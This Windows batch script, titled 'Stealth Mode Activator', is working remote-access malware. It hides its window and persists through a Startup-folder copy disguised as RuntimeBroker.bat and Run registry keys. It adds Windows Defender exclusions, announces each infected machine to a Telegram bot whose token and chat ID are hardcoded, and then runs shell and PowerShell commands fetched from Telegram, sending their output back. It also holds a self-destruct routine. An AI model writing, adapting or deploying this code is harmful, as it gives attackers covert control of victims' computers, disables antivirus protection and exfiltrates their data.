@echo off
:: Stealth Mode Activator
if not "%1"=="--ghost" (
    :: Hide the window immediately
    if "%1"=="" (
        call :hideWindow
        start /B /MIN "" "%~f0" --init
        exit
    )
    
    :: Initialization phase
    if "%1"=="--init" (
        :: Copy to multiple persistence locations
        copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.bat" >nul 2>&1
        copy "%~f0" "%TEMP%\system32_helper.vbs" >nul 2>&1
        
        :: Registry persistence (multiple entries)
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.bat\"" /f >nul 2>&1
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /t REG_SZ /d "wscript.exe \"%TEMP%\system32_helper.vbs\"" /f >nul 2>&1
        
        :: Create VBS wrapper for better stealth
        echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\system32_helper.vbs"
        echo WshShell.Run chr(34) ^& "%~f0" ^& chr(34) ^& " --ghost", 0, False >> "%TEMP%\system32_helper.vbs"
        
        :: Add exclusions to Windows Defender
        powershell -nop -c "Add-MpPreference -ExclusionPath \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"; Add-MpPreference -ExclusionPath \"%TEMP%\"" >nul 2>&1
        
        :: Restart in ghost mode
        start /B /MIN "" "%~f0" --ghost
        exit
    )
)

:: Main stealth routine
:ghost_mode
setlocal enabledelayedexpansion

:: Bot configuration
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: Initial connection notification
powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=🖥️ [%COMPUTERNAME%] - %USERNAME% online' -UseBasicParsing"

:: Main command loop
:command_loop
set "COMMAND="

:: Get latest command from Telegram
for /f "delims=" %%A in ('powershell -nop -c "$resp=try{Invoke-WebRequest -Uri '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text"') do (
    set "COMMAND=%%A"
)

:: Process commands
if defined COMMAND (
    if "!COMMAND!"=="exit" (
        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Session terminated' -UseBasicParsing"
        exit
    )
    
    if "!COMMAND:~0,4!"=="cmd:" (
        set "CMD=!COMMAND:~4!"
        for /f "delims=" %%B in ('cmd /c "!CMD!" 2^>^&1') do set "OUTPUT=%%B"
        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!OUTPUT!' -UseBasicParsing"
    )
    
    if "!COMMAND:~0,3!"=="ps:" (
        set "PS_CMD=!COMMAND:~3!"
        powershell -nop -c "$out=try{iex '!PS_CMD!'|Out-String}catch{\"ERROR: $_\"};$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$out' -UseBasicParsing"
    )
    
    if "!COMMAND!"=="selfdestruct" (
        powershell -nop -c "Remove-Item -Path \"%~f0\" -Force; Remove-Item -Path \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.bat\" -Force; Remove-Item -Path \"%TEMP%\system32_helper.vbs\" -Force"
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /f >nul 2>&1
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /f >nul 2>&1
        exit
    )
)

:: Random delay between checks (5-15 seconds)
powershell -nop -c "Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)"
goto command_loop

:: Function to hide the CMD window
:hideWindow
echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\hide.vbs"
echo objShell.Run "%~f0 --init", 0, False >> "%TEMP%\hide.vbs"
start "" /B wscript.exe "%TEMP%\hide.vbs"
exit /b
